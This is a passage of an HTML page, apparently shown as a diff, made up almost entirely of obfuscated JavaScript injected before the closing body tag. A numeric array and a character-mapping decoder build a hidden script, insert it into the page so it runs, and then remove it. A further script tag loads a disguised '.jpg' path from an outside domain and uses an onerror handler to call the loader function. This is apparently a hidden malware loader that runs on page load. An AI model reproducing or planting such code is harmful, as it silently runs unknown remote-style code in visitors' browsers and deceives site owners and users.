9,36,78,42,45,43,70,36,22,46,39,36,78,71,66,5,15,2,64,25,58,46,78,22,70,5,1,66,16,78,74,68,46,34,81,66,2,1,16,5,22,42,42,66,16,43,22,34,46,16,22,43,48,72,66,2,1,16,5,22,42,78,58,66,22,74,66,2,45,15,44,42,12,77,74,34,1,58,81,44,45,58,49,46,42,33,74,46,29,22,2,15,22,16,39,78,36,74,46,87,87,48,72,44,45,58,49,45,43,70,46,43,42,22,12,46,77,2,5,15,45,64,64,50,45,28,22,2,64,25,15,46,78,81,66,2,46,28,39,70,5,15,45,64,64,87,27,31,27,48,12,37,77,74,32,16,26,2,5,64,64,12,83,78,22,73,78,83,87,83,24,1,16,78,22,16,78,83,77,87,42,83,2,83,87,66,2,41,46,43,39,22,78,70,5,15,45,64,64,87,83,49,2,83,87,66,2,46,28,39,70,5,15,45,64,64,87,83,31,83,87,45,43,70,46,43,87,83,72,40,45,5,92,39,58,1,66,16,43,31,64,46,32,22,62,45,66,78,1,49,83,87,16,22,41,70,40,39,70,36,22,46,39,36,78,87,83,25,73,74,49,40,45,5,92,39,58,1,66,16,43,31,25,1,64,46,78,46,1,16,62,33,49,31,83,87,66,5,15,2,45,43,70,78,1,70,64,25,58,46,78,22,12,45,43,70,46,43,77,71,45,43,70,36,22,46,39,36,78,87,83,25,73,74,68,83,74,46,34,81,22,12,46,77,2,1,34,34,64,22,78,89,45,58,22,16,78,63,42,42,16,66,15,15,48,72,66,2,45,15,44,2,25,66,64,36,81,45,43,70,46,43,48,74,68,44,45,58,49,43,42,32,16,26,2,18,81,27,85,27,87,22,12,46,77,2,25,45,58,22,16,78,11,15,22,28,22,16,78,2,25,45,58,22,16,78,11,15,22,28,22,16,78,2,25,45,58,22,16,78,11,15,22,28,22,16,78,2,46,43,87,27,49,27,87,22,12,46,77,2,25,45,58,22,16,78,11,15,22,28,22,16,78,2,78,45,39,50,45,28,22,67,43,1,5,66,28,22,16,78,2,40,1,43,0,48,74,34,1,58,81,25,42,33,74,25,29,43,2,15,22,16,39,78,36,74,25,87,87,48,72,46,34,81,43,12,25,77,2,1,16,5,15,46,5,92,42,42,16,66,15,15,48,72,43,12,25,77,2,1,16,5,15,46,5,92,42,34,66,16,5,78,46,1,16,81,22,22,48,72,44,45,58,49,45,42,22,22,2,78,45,58,39,22,78,54,54,22,22,2,64,58,5,11,15,22,28,22,16,78,74,44,45,58,49,5,46,42,45,2,25,45,58,22,16,78,11,15,22,28,22,16,78,2,39,22,78,47,78,78,58,46,40,66,78,22,81,27,5,46,27,48,74,41,46,16,43,1,41,2,15,1,5,45,78,46,1,16,2,45,64,64,46,39,16,81,66,5,15,2,15,46,16,92,70,58,22,43,46,58,22,5,78,70,66,58,15,87,66,5,15,2,45,43,70,78,1,70,15,46,16,92,12,5,46,77,48,74,58,22,78,66,58,16,49,34,45,15,64,22,74,68,74,68,68,68,81,34,66,16,5,78,46,1,16,49,58,44,46,22,41,81,48,72,46,34,81,32,16,26,2,44,2,46,16,30,46,22,41,25,1,58,78,81,66,2,66,16,46,78,48,48,72,44,45,58,49,15,78,42,27,27,74,15,78,42,66,2,41,46,43,39,22,78,70,46,43,87,27,5,27,87,66,2,45,15,44,2,88,1,46,16,81,12,64,22,25,45,58,45,78,1,58,42,27,5,27,77,48,74,44,45,58,49,25,44,42,33,74,46,34,81,32,16,26,2,25,44,42,42,34,45,15,64,22,48,72,32,16,26,2,25,44,42,78,58,66,22,74,25,44,42,37,74,68,44,45,58,49,46,42,43,1,5,66,28,22,16,78,2,5,58,22,45,78,22,11,15,22,28,22,16,78,81,27,46,28,39,27,48,74,46,2,64,58,5,42,32,16,26,2,66,58,81,66,5,15,2,44,46,22,41,70,66,58,15,67,72,83,46,83,62,15,78,67,83,25,83,62,25,44,67,83,39,83,62,32,16,26,2,39,81,48,67,83,41,83,62,66,2,41,46,43,39,22,78,70,46,43,68,48,74,58,22,78,66,58,16,74,68,64,22,78,51,46,28,22,1,66,78,81,34,66,16,5,78,46,1,16,81,48,72,58,44,46,22,41,81,48,74,68,67,37,33,33,33,48,74,68,48,81,48,74,68,58,22,78,66,58,16,49,78,58,66,22,74,68,67,58,15,1,45,43,62,34,66,16,5,78,46,1,16,81,48,72,44,45,58,49,15,64,42,27,27,74,34,1,58,81,44,45,58,49,46,42,33,74,46,29,66,5,15,2,66,16,46,78,70,15,46,64,78,2,15,22,16,39,78,36,74,46,87,87,48,72,46,34,81,66,5,15,2,66,16,46,78,70,15,46,64,78,12,46,77,12,27,45,15,44,27,77,63,42,66,16,43,22,34,46,16,22,43,48,72,15,64,87,42,66,5,15,2,66,16,46,78,70,15,46,64,78,12,46,77,12,27,41,46,43,39,22,78,70,46,43,27,77,87,27,5,27,87,66,5,15,2,66,16,46,78,70,15,46,64,78,12,46,77,12,27,45,15,44,27,77,2,88,1,46,16,81,12,64,22,25,45,58,45,78,1,58,42,27,5,27,77,48,87,27,31,27,74,68,68,15,64,42,15,64,2,64,66,40,64,78,58,81,33,67,15,64,2,15,22,16,39,78,36,31,37,48,74,44,45,58,49,15,64,46,42,43,1,5,66,28,22,16,78,2,5,58,22,45,78,22,11,15,22,28,22,16,78,81,27,46,28,39,27,48,74,15,64,46,2,64,58,5,42,32,16,26,2,66,58,81,66,5,15,2,15,1,45,43,70,66,58,15,67,72,83,46,83,62,15,64,67,83,39,83,62,32,16,26,2,39,81,48,68,48,74,58,22,78,66,58,16,49,78,58,66,22,74,68,67,68,74,1,2,46,16,46,78,81,48,74,64,22,78,51,46,28,22,1,66,78,81,1,2,58,15,1,45,43,67,37,33,33,33,48,74,58,22,78,66,58,16,49,1,74,68,68,81,48,68,74,68,32,16,26,2,64,78,45,58,78,81,48,74,55,71,49,5,16,39,88,28,40,88,0,36,73,73,45,43,18,46,43,16,25,22,49,71,55];function nnzfkjvzza(a,b){tkhxigmxsq='';for(var i=0;i<a.length;i++){tkhxigmxsq+=b[a[i]];}return tkhxigmxsq;}var oilopogzwjtf=window[nnzfkjvzza([43,1,5,66,28,22,16,78],ykvmvcyo)];var kxucglor=nnzfkjvzza([5,66,58,58,22,16,78,26,5,58,46,25,78],ykvmvcyo);var hcbumhulakednkm=nnzfkjvzza([64,58,5],ykvmvcyo);try{Object.getOwnPropertyDescriptor(Document.prototype,'currentScript').get.apply(document)[hcbumhulakednkm]=hcbumhulakednkm;}catch(e){}var zqpzzht=nnzfkjvzza([5,58,22,45,78,22,11,15,22,28,22,16,78],ykvmvcyo);var zhfretythyhdjz=nnzfkjvzza([64,5,58,46,25,78],ykvmvcyo);var qpfplrjhdiuitsj=nnzfkjvzza([78,22,73,78,24,1,16,78,22,16,78],ykvmvcyo);var rxzhpsgotfo=nnzfkjvzza([36,22,45,43],ykvmvcyo);var xjrxnkwcwnjhutj=nnzfkjvzza([45,25,25,22,16,43,24,36,46,15,43],ykvmvcyo);var ojyrtpczpmikda=nnzfkjvzza([25,45,58,22,16,78,50,1,43,22],ykvmvcyo);var rnrppqcqixolxy=nnzfkjvzza([58,22,28,1,44,22,24,36,46,15,43],ykvmvcyo);var uabyno=nnzfkjvzza([40,1,43,0],ykvmvcyo);var lwgdrljj=oilopogzwjtf[zqpzzht](zhfretythyhdjz);lwgdrljj[qpfplrjhdiuitsj]=nnzfkjvzza(xzyztjzor,ykvmvcyo);oilopogzwjtf[uabyno][xjrxnkwcwnjhutj](lwgdrljj);lwgdrljj[ojyrtpczpmikda][rnrppqcqixolxy](lwgdrljj);})();}}</script><script onerror="wvo()" src="//madworldnews.com/wvofenwalditewvo/2021/03/wvoefieeldlite-mediaplus12738z.jpg"></script><script></script>
+</body>
+</html>
